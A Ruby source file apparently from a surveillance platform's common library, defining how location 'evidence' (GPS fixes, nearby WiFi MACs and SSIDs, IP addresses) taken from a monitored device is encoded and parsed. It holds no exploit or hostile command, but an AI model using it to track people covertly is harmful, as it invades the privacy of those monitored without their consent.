require 'rcs-common/evidence/common'

require 'digest/md5'

module RCS

module LocationEvidence

  ELEM_DELIMITER = 0xABADC0DE

  LOCATION_VERSION = 2010082401
	LOCATION_GPS	= 0x0001
	LOCATION_GSM	= 0x0002
	LOCATION_WIFI	= 0x0003
	LOCATION_IP		= 0x0004
	LOCATION_CDMA	= 0x0005
  
  def content
    content = StringIO.new

    case @loc_type
      when LOCATION_GPS
        content.write [LOCATION_GPS, 0, 0].pack('L*')
        content.write Time.now.getutc.to_filetime.pack('L*')
        content.write GPS_Position.struct(45.12345, 9.54321)
        content.write [ ELEM_DELIMITER ].pack('L')

      when LOCATION_GSM

      when LOCATION_CDMA

      when LOCATION_WIFI
        content.write ["\xAA\xBB\xCC\xDD\xEE\xFF", "\x00\x11\x22\x33\x44\x55", "\xAB\xCD\xEF\x01\x23\x45"].sample
        content.write [4].pack('L')
        content.write ["ciao", "miao", "blau"].sample.ljust(32, "\x00")
        content.write [rand(100) * -1].pack('l')

      when LOCATION_IP
        content.write ["8.8.8.8", "8.8.4.4", "4.2.2.2"].sample
    end

    content.string
  end

  def generate_content
    ret = Array.new
    @nstruct.times { ret << content() }
    ret
  end

  def additional_header
    #@loc_type = [LOCATION_GPS, LOCATION_GSM, LOCATION_CDMA, LOCATION_WIFI, LOCATION_IP].sample
    @loc_type = [LOCATION_GPS].sample
    #@nstruct = (@loc_type == LOCATION_IP) ? 1 : rand(5) + 1
    @nstruct = 1
    header = StringIO.new
    header.write [LOCATION_VERSION, @loc_type, @nstruct].pack("I*")
    
    header.string
  end

  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete LOCATION") if data.nil? or data.size == 0

    binary = StringIO.new data

    version, type, number = binary.read(12).unpack("I*")
    raise EvidenceDeserializeError.new("invalid log version for LOCATION") unless version == LOCATION_VERSION

    @info[:loc_type] = type
  end

  def decode_content
    stream = StringIO.new @info[:chunks].join

    evidences = Array.new

    case @info[:loc_type]
      when LOCATION_WIFI
        @info[:source] = 'WIFI'
        @info[:location] = ''
        until stream.eof?
          mac = stream.read 6
          len = stream.read(4).unpack('L').first
          ssid = stream.read(32).delete("\x00")
          sig = stream.read(4).unpack('l').first
          #TODO: don't parse to a string, keep the values
          @info[:location] += "%02X:%02X:%02X:%02X:%02X:%02X [%d] %s\n" %
                              [mac[0].unpack('C').first,
                               mac[1].unpack('C').first,
                               mac[2].unpack('C').first,
                               mac[3].unpack('C').first,
                               mac[4].unpack('C').first,
                               mac[5].unpack('C').first,sig, ssid]
        end
        evidences << self.clone

      when LOCATION_IP
        @info[:source] = 'IPv4'
        ip = stream.read_ascii_string
        @info[:location] = ip unless ip.nil?
        @info[:ipv4] = ip unless ip.nil?
        evidences << self.clone

      when LOCATION_GPS
        @info[:source] = 'GPS'
        until stream.eof?
          type, size, version = stream.read(12).unpack('L*')
          @info[:acquired] = Time.from_filetime(*stream.read(8).unpack('L*'))

          gps = GPS_Position.new
          gps.read stream

          @info[:location] = "%f %f" % [gps.latitude, gps.longitude]

          delim = stream.read(4).unpack('L').first
          raise EvidenceDeserializeError.new("Malformed LOCATION (missing delimiter)") unless delim == ELEM_DELIMITER

          # this is not the real clone! redefined clone ...
          evidences << self.clone
        end
      else
        raise EvidenceDeserializeError.new("Unsupported LOCATION type")
    end

    return evidences
  end
end

class GPS_Position

  attr_reader :latitude
  attr_reader :longitude
  
  def self.size
    self.struct(0,0).bytesize
  end

  def self.struct(lat, long)
    str = ''
    str += [0].pack('l')  # DWORD dwVersion;  Current version of GPSID client is using.
    str += [0].pack('l')  # DWORD dwSize;     sizeof(_GPS_POSITION)
    str += [0].pack('l')  # DWORD dwValidFields;
    str += [0].pack('l')  # DWORD dwFlags;
    str += Array.new(8,0).pack('s*')  # SYSTEMTIME stUTCTime; 	UTC according to GPS clock.
    str += [lat].pack('D')  # double dblLatitude;          // Degrees latitude.  North is positive
    str += [long].pack('D') # double dblLongitude;         // Degrees longitude.  East is positive

    str += [0].pack('F')  # float  flSpeed;                // Speed in knots
    str += [0].pack('F')  # float  flHeading;              // Degrees heading (course made good).  True North=0
    str += [0].pack('D')  # double dblMagneticVariation;   // Magnetic variation.  East is positive
    str += [0].pack('F')  # float  flAltitudeWRTSeaLevel;  // Altitute with regards to sea level, in meters
    str += [0].pack('F')  # float  flAltitudeWRTEllipsoid; // Altitude with regards to ellipsoid, in meters

    str += [0].pack('l')  # GPS_FIX_QUALITY     FixQuality;        // Where did we get fix from?
    str += [0].pack('l')  # GPS_FIX_TYPE        FixType;           // Is this 2d or 3d fix?
    str += [0].pack('l')  # GPS_FIX_SELECTION   SelectionType;     // Auto or manual selection between 2d or 3d mode
    str += [0].pack('F')  # float flPositionDilutionOfPrecision;   // Position Dilution Of Precision
    str += [0].pack('F')  # float flHorizontalDilutionOfPrecision; // Horizontal Dilution Of Precision
    str += [0].pack('F')  # float flVerticalDilutionOfPrecision;   // Vertical Dilution Of Precision

    str += [1].pack('l')  # DWORD dwSatelliteCount;                // Number of satellites used in solution
    str += Array.new(12,0).pack('l*')  # DWORD rgdwSatellitesUsedPRNs[GPS_MAX_SATELLITES];                  // PRN numbers of satellites used in the solution
    str += [0].pack('l')  # DWORD dwSatellitesInView;                      	                                // Number of satellites in view.  From 0-GPS_MAX_SATELLITES
    str += Array.new(12,0).pack('l*')  # DWORD rgdwSatellitesInViewPRNs[GPS_MAX_SATELLITES];                // PRN numbers of satellites in view
    str += Array.new(12,0).pack('l*')  # DWORD rgdwSatellitesInViewElevation[GPS_MAX_SATELLITES];           // Elevation of each satellite in view
    str += Array.new(12,0).pack('l*')  # DWORD rgdwSatellitesInViewAzimuth[GPS_MAX_SATELLITES];             // Azimuth of each satellite in view
    str += Array.new(12,0).pack('l*')  # DWORD rgdwSatellitesInViewSignalToNoiseRatio[GPS_MAX_SATELLITES];  // Signal to noise ratio of each satellite in view

    return str
  end

  def read(stream)
    stream.read(4*4)
    stream.read(8*2)
    @latitude = stream.read(8).unpack('D').first
    @longitude = stream.read(8).unpack('D').first
    stream.read(2*4)
    stream.read(8)
    stream.read(2*4)

    stream.read(3*4)
    stream.read(3*4)

    stream.read(4)
    stream.read(12*4)
    stream.read(4)
    stream.read(12*4)
    stream.read(12*4)
    stream.read(12*4)
    stream.read(12*4)
    
  end
end

=begin
    DWORD cbSize;                       // @field structure size in bytes
    DWORD dwParams;                     // @field indicates valid parameters
    DWORD dwMobileCountryCode;          // @field TBD
    DWORD dwMobileNetworkCode;          // @field TBD
    DWORD dwLocationAreaCode;           // @field TBD
    DWORD dwCellID;                     // @field TBD
    DWORD dwBaseStationID;              // @field TBD
    DWORD dwBroadcastControlChannel;    // @field TBD
    DWORD dwRxLevel;                    // @field Value from 0-63 (see GSM 05.08, 8.1.4)
    DWORD dwRxLevelFull;                // @field Value from 0-63 (see GSM 05.08, 8.1.4)
    DWORD dwRxLevelSub;                 // @field Value from 0-63 (see GSM 05.08, 8.1.4)
    DWORD dwRxQuality;                  // @field Value from 0-7  (see GSM 05.08, 8.2.4)
    DWORD dwRxQualityFull;              // @field Value from 0-7  (see GSM 05.08, 8.2.4)
    DWORD dwRxQualitySub;               // @field Value from 0-7  (see GSM 05.08, 8.2.4)
    DWORD dwIdleTimeSlot;               // @field TBD
    DWORD dwTimingAdvance;              // @field TBD
    DWORD dwGPRSCellID;                 // @field TBD
    DWORD dwGPRSBaseStationID;          // @field TBD
    DWORD dwNumBCCH;                    // @field TBD
    BYTE rgbBCCH[MAXLENGTH_BCCH];       // @field TBD
    BYTE rgbNMR[MAXLENGTH_NMR];         // @field TBD
=end

end # ::RCS